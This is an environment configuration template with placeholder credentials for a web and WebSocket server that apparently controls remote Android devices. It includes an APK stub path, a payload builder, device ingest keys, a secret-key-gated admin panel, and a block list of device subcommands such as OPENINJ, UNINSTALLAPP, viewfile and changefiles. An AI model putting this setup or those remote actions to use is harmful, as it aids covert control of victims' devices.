# Database Configuration
DB_HOST=127.0.0.1
DB_USER=root
DB_PASSWORD=CHANGE_ME_TO_STRONG_PASSWORD
DB_NAME=clients

# Encryption Keys (generate new random keys for production!)
SECRET_KEY=CHANGE_ME_32_CHAR_RANDOM_STRING_
SECRET_IV=CHANGE_ME_16_CHAR_
SECRET_IV_JEC=CHANGE_ME_32_CHAR_RANDOM_STRING_

# Admin Key (use a strong password)
ADMIN_KEY=CHANGE_ME_STRONG_ADMIN_PASSWORD

# Email Configuration
EMAIL_HOST_SITE=email.yoursite.site
EMAIL_NAME_SITE=yoursite Support
EMAIL_ADDRESS_SITE=support@yoursite.site
EMAIL_PASS_SITE=CHANGE_ME

EMAIL_HOST_COM=email.yoursite.com
EMAIL_NAME_COM=yoursite Support
EMAIL_ADDRESS_COM=support@yoursite.com
EMAIL_PASS_COM=CHANGE_ME

# WebSocket Configuration
WS_PORT=8080
HTTP_PORT=3000
WS_HOST=127.0.0.1
HTTP_HOST=127.0.0.1
WS_URL=wss://yourdomain.com/api/ws/
WS_ADMIN_TOKEN=CHANGE_ME_LONG_RANDOM_TOKEN
WS_DEVICE_AUTH_TOKEN=
WS_SUPER_EMAIL_HASH=
WS_MAX_MESSAGE_BYTES=2097152
WS_MAX_CONNECTIONS=500
WS_MAX_CONNECTIONS_PER_IP=40
WS_MAX_MESSAGES_PER_MINUTE=180
WS_SECURITY_AUDIT_LOG=ws_security_audit.log
WS_BLOCKED_ADMIN_SUBCOMMANDS=OPENINJ,changefiles,Delete,delete,UNINSTALLAPP,DIAO,files,viewfile,rename,fetch,cocu,srch
WS_ENFORCE_BLOCKLIST=true
WS_ALLOWED_ORIGINS=https://yourdomain.com
ALLOW_GET_TOKEN=false
PASSWORD_POLICY_STRICT=true
PASSWORD_MIN_LENGTH=8

# CORS Allowed Origins (comma-separated)
CORS_ALLOWED_ORIGINS=https://yourdomain.com

# Application paths (Linux)
APP_BASE_PATH=/var/www/html
APK_STUB_PATH=/var/www/html/private/apkstub/apkstub.zip

# Device ingest API key (optional, but strongly recommended)
DEVICE_API_KEY=CHANGE_ME_DEVICE_API_KEY
ERROR_API_KEY=

# Build engine switch (recommended false on Ubuntu)
ENABLE_BUILDER=false
BUILDER_CALLBACK_TOKEN=CHANGE_ME_BUILDER_CALLBACK_TOKEN

# Optional: restrict admin login page by IP (comma-separated). Empty = no extra IP restriction.
ADMIN_LOGIN_ALLOWED_IPS=

# Hide admin panel behind secret key (recommended)
# Access example: /private/login.php?panel_key=YOUR_KEY
ADMIN_PANEL_ACCESS_KEY=CHANGE_ME_LONG_RANDOM_PANEL_KEY
ADMIN_PANEL_STRICT_GATE=true
